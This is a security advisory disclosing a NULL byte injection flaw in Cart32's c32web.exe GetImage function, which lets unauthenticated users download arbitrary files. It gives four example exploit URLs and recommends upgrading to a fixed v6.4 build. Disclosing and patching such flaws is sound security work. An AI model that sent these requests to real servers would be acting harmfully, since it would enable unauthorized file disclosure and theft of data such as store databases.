== Overview ==
Security-Assessment.com has discovered a highly critical vulnerability
within the Cart32 administrative application. The vulnerability allows
a remote unauthenticated user to arbitrarily download any file present
on the same physical disk that Cart32 is installed on. 

The vulnerability stems from a NULL byte injection flaw within a file
read function.

== Exploitation ==

The function GetImage, part of c32web.exe displays various images from
a supplied "ImageName" variable. 
http://host.com/scripts/c32web.exe/GetImage?ImageName=test.gif

C32web.exe attempts to prevent arbitrary files from being disclosed by
only returning files with an extension of .jpg, .gif, .png and .pdf.

Any file, of any extension type can be downloaded when a NULL byte is
injected into the ImageName variable with a valid file extension
suffixed
directly after.

Example
http://host.com/scripts/c32web.exe/GetImage?ImageName=somefile.txt%00.gi
f
http://host.com/scripts/c32web.exe/GetImage?ImageName=somefile.txt%00.jp
g
http://host.com/scripts/c32web.exe/GetImage?ImageName=somefile.txt%00.pd
f
http://host.com/scripts/c32web.exe/GetImage?ImageName=somefile.txt%00.pn
g

This vulnerability can be used to read any file on disk, including the
cart32 database.

== Solutions ==

A new build of Cart32 v6.4 is available to address this vulnerability.
Security-Assessment.com highly recommends all Cart32 users to upgrade.
